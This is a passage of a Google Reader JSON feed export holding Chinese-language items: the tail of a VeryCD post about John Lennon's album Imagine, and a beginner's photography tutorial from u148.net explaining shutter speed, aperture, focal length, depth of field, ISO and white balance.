Henley）承认，这首歌对于他有双重的意义。一方面这是一首很有安慰作用的歌曲，另一方面，这首歌也永久地和暴力联系在了一起。如果我们不能摆脱上帝和财产的束缚，我们就永远不会摆脱暴力的阴影。对于歌中有关宗教的那句歌词，汉利说，他很有共鸣，因为他觉得世界上的任何宗教一开始时都有着好的愿望，但最后总是被疯狂的人所异化。他觉得列侬本人是一个很看重精神世界的人，他不是反对精神世界的宗教，而是反对“有组织的宗教”（Organized Religion），只是歌词需要简洁押韵，不适合说“有组织的宗教”罢了。<br>　　U2的波诺（Bono）曾说，列侬是他最欣赏的歌曲作者。这首歌他最欣赏的就是里面佛教的理念，即“想像之后是行动”。他不喜欢现在有的人把这首歌当作是新世纪（New Age）的圣歌，在他看来，这首歌告诉人们，你一定要先有一个想像，一个计划，然后则必须付诸行动，否则就没有任何意义。而列侬的伟大之处就在于，他不但这样想了，也这样行动了。<br>　　Rage Against the Machine乐队的吉它手Tom Morello说，如果人们真的理解了列侬在这首歌中所要表达的感情，那么我们早就会在这个国家里掀起一场革命了。<br>专辑曲目: <br>        1. Imagine<br>2. Crippled Inside<br>3. Jealous Guy<br>4. It's So Hard<br>5. I Don't Wanna Be a Soldier<br>6. Gimme Some Truth<br>7. Oh My Love<br>8. How Do You Sleep?<br>9. How?<br>10. Oh Yoko!<br>本专辑已加入Mp3共享计划        <br><a href=\"http://www.verycd.com/topics/136679/#theCom\">评论(313) </a>  <a href=\"http://www.verycd.com/topics/136679/\">收藏(995) </a>  <a href=\"http://www.verycd.com/topics/136679/\">查看完整资源页</a><br>"
    },
    "author" : "The Eagles",
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://www.verycd.com/best/feed",
      "title" : "VeryCD资源推荐位",
      "htmlUrl" : "http://www.verycd.com/best/"
    }
  }, {
    "isReadStateLocked" : true,
    "crawlTimeMsec" : "1286204498780",
    "timestampUsec" : "1286204498780704",
    "id" : "tag:google.com,2005:reader/item/e5b0dd1c824b3675",
    "categories" : [ "user/07404792466326621424/state/com.google/read", "user/07404792466326621424/state/com.google/starred", "杂碎" ],
    "title" : "我想说的几句话——关于摄影（1）",
    "published" : 1286204498,
    "updated" : 1286204498,
    "alternate" : [ {
      "href" : "http://www.u148.net/article/27063.html",
      "type" : "text/html"
    } ],
    "summary" : {
      "direction" : "ltr",
      "content" : "<p>        写下这个题目的时候，多少有点脸红，因为标题有点大。</p><p>        在U吧，从一个潜水者，到偶尔吐几个气泡。写下点东西。看到大家的一些反应，因此，总想在这里说点什么。</p><p>        文字，一直以来都不是我擅长的东西。也许，相机也不见得是我的擅长，只是更熟悉吧。</p><p>        我想尝试用比较苍白的语言，来描述一些相机上的使用技巧、方法。我想分享一些东西，让大家能够更多的去了解。我想通过一些努力，让这种能触摸心房，感动，或者纪念的行为能够被更多人去尝试。</p><p> </p><p>        因水平的关系，如果有错误的或者不明白的地方，希望大家能够指出。如果大家想了解那些东西，可以留言，我会尝试写下来。我想争取用3-5期来做这个题目。</p><p> </p><p>        这期我们先着重说一些基本知识。一些我们能用到的，或者，将来需要用到的。大家的相机多少都带有一些手动功能，利用一些手动功能来实现一些特别的效果。</p><p> </p><p><span style=\"font-size:16px\"><span style=\"color:#0000ff\"><font color=\"#000000\">        </font><strong>快门</strong></span></span></p><p>        快门是相机上控制感光片有效曝光时间的一种装置。目前的数码相机快门包括了电子快门、机械快门和B门。</p><p> </p><p><span style=\"font-size:16px\"><span style=\"color:#0000ff\"><em><strong>        </strong></em><strong>快门速度</strong></span></span></p><p>        快门开合的时间，决定了在一定时间内，通过光线的多少。</p><p>        我们在实际应用中，一般来讲1/60基本够用，如果拍摄运动物体，当距离在3米左右，1/200快门基本能够满足。当然距离越近，需要的快门速度就越快。这里给的是一个模糊值。</p><p> </p><p><span style=\"font-size:16px\"><span style=\"color:#0000ff\"><em><strong>        </strong></em><strong>安全快门</strong></span></span></p><p>        <strong>作用：让大家的照片尽量保证不模糊。</strong></p><p>        安全快门速度是焦距的倒数，也就是安全快门速度=1/焦距。</p><p>        举个简单的例子，如果在佳能EOS 30D上使用一支50mm的镜头，那么1/80秒就是安全快门（因为EOS 30D的焦距转换系数为1.6，所以50mm的镜头装上去，实际等效焦距是80mm）。如果你选择1/125秒或者1/250秒快门，拍摄的稳定性是有保证的，反之，如果你选择1/30秒这样的快门，那么，则有可能会发生“拍虚”的情况。如果换上一支100mm的镜头，那么这时候1/160秒以上才能保证拍摄的稳定性。当然，不是说一定会出现拍虚的情况，只是，出现这种情况的可能性就大大增加了。<br>        这里涉及到一个等效焦距的问题，这个大家可以看自己相机的说明书，一般来讲都是1.5或者1.6。当然大家也可以看自己的镜头，上面有标明。在下面我教大家如何识别标明。</p><p>                    </p><p><span style=\"color:#0000ff\"><span style=\"font-size:16px\"><font color=\"#000000\">        </font><strong>光圈</strong></span></span></p><p>        光圈是一个用来控制光线透过镜头，进入机身内感光面的光量的装置。光圈的数值从1.2-32F，数值越小，我们称光圈越大。</p><p>        光圈同时也决定了景深的大小，这点我们在下面讲到。</p><p>        <strong>举例：在夜晚，拍摄运动物体，为了保证图像不虚，快门要相应的提高速度，但为了保证图片的明亮度，我们就要放大光圈。</strong></p><p> </p><p style=\"text-align:center\"> <a href=\"http://www.u148.net/\"><img alt=\"www.u148.net\" src=\"http://file2.u148.net/images/2010/9/1285154243915.jpg\"></a></p><p style=\"text-align:center\"> </p><p><span style=\"color:#0000ff\"><span style=\"font-size:16px\"><em><strong>        </strong></em><strong>焦距</strong></span></span></p><p>        从镜片中心到底片或CCD等成像平面的距离。如果你看到你的数码相机的镜头上写着f=8-24mm，38-115mm(35mm equivalent)，就是指这台相机的焦距长度为8-24mm，同时对角线的视角换算后相当于传统35mm相机的38-115mm焦长。我们可以简单的理解成，这台相机的焦距是38-115。</p><p>        这里大家要知道另外一个问题，28mm以下我们称之为广角，70mm以上我们称为长焦。</p><p style=\"text-align:center\"> <a href=\"http://www.u148.net/\"><img alt=\"www.u148.net\" src=\"http://file2.u148.net/images/2010/9/1285251530108.jpg\"></a></p><p> </p><p>        说明：大家可以看到50-100焦距，这个焦段的人像，我们感觉最舒服，这是最适合人像摄影的焦段。因为这个焦段最符合我们视觉关系。</p><p>        另外，大家也能看到随着焦距的增加，背景的图像越来越模糊，图片的纵深感越来越浅，也越来越能突出的显示人物。而这种模糊与清晰的变化，我们称之为景深。</p><p> </p><p><span style=\"color:#0000ff\"><span style=\"font-size:16px\"><em><strong>        </strong></em><strong>景深</strong></span></span></p><p>        景深是指在摄影机镜头或其他成像器前沿着能够取得清晰图像的成像景深相机器轴线所测定的物体距离范围。在聚焦完成后，在焦点前后的范围内都能形成清晰的像，这一前一后的距离范围，便叫做景深。</p><p>        景深的作用可以分成两方面，一方面表现清晰，一方面表现模糊，例如你要突出表现某人物或者物体，就可以让景深浅些，让人物或者物体成为图像中的亮点。如果你像表现出整体，那么景深大点，会让远处和近处的物体同时清晰。</p><p>        控制景深的方法有这样几种：</p><p> </p><p>        景深浅：大光圈             长焦距          近距离</p><p>        景深大：小光圈             短焦距          远距离</p><p> </p><p><span style=\"color:#0000ff\"><span style=\"font-size:16px\"><em><strong>       </strong></em><strong> ISO</strong></span></span></p><p>        衡量传统相机所使用胶片感光速度标准。数码相机采用了模拟方式。</p><p>        我们可以在较暗的地方使用大ISO，在牺牲一定的图像质量的情况下，保证图像的亮度。</p><p>        大家要注意一点的是，不同机器支持的ISO最大值并不一样，而且，也不是越大的ISO越好，因为越大的ISO，牺牲的图像质量越多。</p><p>        相对来讲，现在的数码机器，设定ISO400，一般都是我们可以接受的程度。当然，比较新的数码相机在高ISO处理的情况更好些。</p><p>        改变ISO可以起到以下几个作用：</p><p> </p><p>        ISO数值小    更有质感        感光值变小</p><p>        ISO数值大    噪点增多        感光值变大</p><p style=\"text-align:center\"> <a href=\"http://www.u148.net/\"><img alt=\"www.u148.net\" src=\"http://file2.u148.net/images/2010/9/1285253778595.jpg\"></a></p><p> </p><p>        这是使用尼康D700来拍摄的，随着ISO的变大，噪点在逐渐增加。ISO200的画质最好，ISO1600的效果仍然让我们可以接受，ISO25600的噪点过多，已经让人无法接受。大家的机器不妨可以自己试试看。</p><p> </p><p>        <span style=\"color:#0000ff\"><strong><span style=\"font-size:16px\">白平衡</span></strong></span></p><p>        白平衡是描述红（R）、绿（G）、蓝（B）三基色混合生成后白色精确度的一项指标。</p><p style=\"text-align:center\"> <a href=\"http://www.u148.net/\"><img alt=\"www.u148.net\" src=\"http://file2.u148.net/images/2010/9/1285291423186.jpg\"></a></p><p> </p><p>        通过上面的照片我们可以看到在不同的白平衡下，图片表现的颜色发生不同的变化，前者图片偏黄，略显温暖，后者，图片偏白，但比较能真实的还原物体本身的颜色。</p><p>        在某些时候使用用好白平衡能给图片带来清冷或温暖的感觉。当然，如果想做一些其他方面的调整，就需要调整色温。</p><p> </p><p>        基本上这些东西，能满足大家的一般性的摄影需要了，当然，需要了解的东西还有很多，我在下面几期分别介绍。</p><p>        PS：大家如果有什么想法不妨说说。下期，我试试看和大家聊聊构图方面的东西。</p><p> </p><p>查看详情评论：<a href=\"http://www.u148.net/article/27063.html\">我想说的几句话——关于摄影（1）</a></p><p>本文原始链接：<a href=\"http://www.u148.net/article/27063.html\">http://www.u148.net/article/27063.html</a></p><p>欢迎大家访问：<a href=\"http://www.u148.net\"><strong>有意思吧 Www.U148.Net - 分享·情怀·超越 ，不仅仅是娱乐！</strong></a></p><p> </p><a href=\"http://s.click.taobao.com/a/qvVmnYhD5qI=-15599093\"><img src=\"http://img.u148.net/activity/2010/7/inoherb.gif\" border=\"0\"></a><p> </p>"
    },
    "author" : "webmaster@u148.net ( 有意思吧 - David )",
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://feed.u148.net/",
      "title" : "有意思吧",
      "htmlUrl" : "http://www.u148.net"
    }
  } ]
}